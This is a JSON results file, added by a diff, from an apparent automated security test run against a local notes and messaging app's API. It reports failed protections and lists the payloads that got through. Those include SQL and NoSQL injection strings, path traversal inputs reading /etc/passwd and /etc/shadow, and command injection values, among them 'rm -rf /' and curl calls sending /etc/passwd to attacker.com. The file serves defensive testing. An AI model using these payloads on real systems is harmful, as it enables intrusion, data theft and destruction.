@@ -1,0 +1,462 @@
+{
+  "summary": {
+    "total_tests": 15,
+    "passed_tests": 6,
+    "failed_tests": 9,
+    "success_rate": 40.0,
+    "critical_failures": 2,
+    "security_vulnerabilities": 55,
+    "timestamp": "2025-09-10T13:34:40.420242"
+  },
+  "critical_failures": [
+    {
+      "test": "Advanced SQL Injection Protection",
+      "details": "Only blocked 9/32 attempts - SECURITY VULNERABILITY",
+      "severity": "CRITICAL"
+    },
+    {
+      "test": "Advanced XSS Protection",
+      "details": "Only blocked 0/15 XSS attempts",
+      "severity": "CRITICAL"
+    }
+  ],
+  "security_vulnerabilities": [
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' OR '1'='1",
+      "endpoint": "/notes",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' OR '1'='1",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "'; WAITFOR DELAY '00:00:05' --",
+      "endpoint": "/notes",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "'; WAITFOR DELAY '00:00:05' --",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' OR (SELECT COUNT(*) FROM sysobjects) > 0 WAITFOR DELAY '0:0:5' --",
+      "endpoint": "/notes",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' OR (SELECT COUNT(*) FROM sysobjects) > 0 WAITFOR DELAY '0:0:5' --",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --",
+      "endpoint": "/notes",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
+      "endpoint": "/notes",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
+      "endpoint": "/notes",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+      "endpoint": "/notes",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "'; db.notes.drop(); //",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' || this.password == 'password' || '",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "{\"$where\": \"this.password == 'password'\"}",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "SQL_INJECTION_BYPASS",
+      "payload": "' %55NION %53ELECT * FROM users --",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "CSRF_VULNERABILITY",
+      "endpoint": "http://localhost:8001/api/notes",
+      "method": "POST",
+      "response_code": 200
+    },
+    {
+      "type": "CSRF_VULNERABILITY",
+      "endpoint": "http://localhost:8001/api/steelos-shredder/deploy",
+      "method": "POST",
+      "response_code": 200
+    },
+    {
+      "type": "CSRF_VULNERABILITY",
+      "endpoint": "http://localhost:8001/api/pin/verify",
+      "method": "POST",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "../../../etc/passwd",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "....//....//....//etc//passwd",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "..%252f..%252f..%252fetc%252fpasswd",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "..%252f..%252f..%252fetc%252fpasswd",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "/var/log/apache2/access.log",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "/var/log/apache2/access.log",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "/proc/self/environ",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "/proc/self/environ",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "C:\\boot.ini",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "C:\\boot.ini",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "/etc/shadow",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "DIRECTORY_TRAVERSAL",
+      "payload": "/etc/shadow",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "; ls -la",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "; ls -la",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "| cat /etc/passwd",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "&& whoami",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "&& whoami",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "`id`",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "`id`",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "$(uname -a)",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "$(uname -a)",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "; ping -c 1 127.0.0.1",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "; ping -c 1 127.0.0.1",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "| nc -l 4444",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "| nc -l 4444",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "&& curl http://attacker.com/steal",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "&& curl http://attacker.com/steal",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "; rm -rf /",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "; rm -rf /",
+      "endpoint": "/envelopes/send",
+      "response_code": 200
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "payload": "$(curl -X POST http://attacker.com/exfiltrate -d @/etc/passwd)",
+      "endpoint": "/steelos-shredder/deploy",
+      "response_code": 200
+    }
+  ],
+  "detailed_results": [
+    {
+      "test": "Basic API Connectivity",
+      "success": true,
+      "details": "Root endpoint responding correctly",
+      "severity": "MEDIUM",
+      "timestamp": "2025-09-10T13:34:34.393964"
+    },
+    {
+      "test": "Advanced SQL Injection Protection",
+      "success": false,
+      "details": "Only blocked 9/32 attempts - SECURITY VULNERABILITY",
+      "severity": "CRITICAL",
+      "timestamp": "2025-09-10T13:34:34.456408"
+    },
+    {
+      "test": "Advanced XSS Protection",
+      "success": false,
+      "details": "Only blocked 0/15 XSS attempts",
+      "severity": "CRITICAL",
+      "timestamp": "2025-09-10T13:34:34.483120"
+    },
+    {
+      "test": "PIN Timing Attack Resistance",
+      "success": true,
+      "details": "Timing difference: 0.006s - resistant to timing attacks",
+      "severity": "MEDIUM",
+      "timestamp": "2025-09-10T13:34:38.017841"
+    },
+    {
+      "test": "Cryptographic Signature Format",
+      "success": true,
+      "details": "Valid HMAC-SHA256 signature: 64 chars",
+      "severity": "MEDIUM",
+      "timestamp": "2025-09-10T13:34:38.022719"
+    },
+    {
+      "test": "Cryptographic Signature Strength",
+      "success": true,
+      "details": "Signature cannot be forged with weak key",
+      "severity": "MEDIUM",
+      "timestamp": "2025-09-10T13:34:38.022788"
+    },
+    {
+      "test": "Authentication Bypass Protection",
+      "success": true,
+      "details": "All 7 bypass attempts blocked",
+      "severity": "MEDIUM",
+      "timestamp": "2025-09-10T13:34:38.037771"
+    },
+    {
+      "test": "Rate Limiting Bypass Resistance",
+      "success": false,
+      "details": "Rate limiting bypassed: 20/20 requests succeeded",
+      "severity": "HIGH",
+      "timestamp": "2025-09-10T13:34:40.094397"
+    },
+    {
+      "test": "Memory Clearing - Note Creation",
+      "success": false,
+      "details": "HTTP 429",
+      "severity": "MEDIUM",
+      "timestamp": "2025-09-10T13:34:40.097000"
+    },
+    {
+      "test": "File Upload Security",
+      "success": false,
+      "details": "Only blocked 0/6 malicious uploads",
+      "severity": "HIGH",
+      "timestamp": "2025-09-10T13:34:40.119300"
+    },
+    {
+      "test": "Voice Message Security",
+      "success": false,
+      "details": "Only blocked 0/4 malicious voice uploads",
+      "severity": "HIGH",
+      "timestamp": "2025-09-10T13:34:40.166111"
+    },
+    {
+      "test": "Race Condition Protection",
+      "success": true,
+      "details": "No race conditions detected in concurrent operations",
+      "severity": "MEDIUM",
+      "timestamp": "2025-09-10T13:34:40.178100"
+    },
+    {
+      "test": "CSRF Protection",
+      "success": false,
+      "details": "Only 0/3 endpoints protected against CSRF",
+      "severity": "HIGH",
+      "timestamp": "2025-09-10T13:34:40.305473"
+    },
+    {
+      "test": "Directory Traversal Protection",
+      "success": false,
+      "details": "Only blocked 3/30 traversal attempts",
+      "severity": "HIGH",
+      "timestamp": "2025-09-10T13:34:40.363635"
+    },
+    {
+      "test": "Command Injection Protection",
+      "success": false,
+      "details": "Only blocked 2/30 injection attempts",
+      "severity": "HIGH",
+      "timestamp": "2025-09-10T13:34:40.420046"
+    }
+  ]
+}
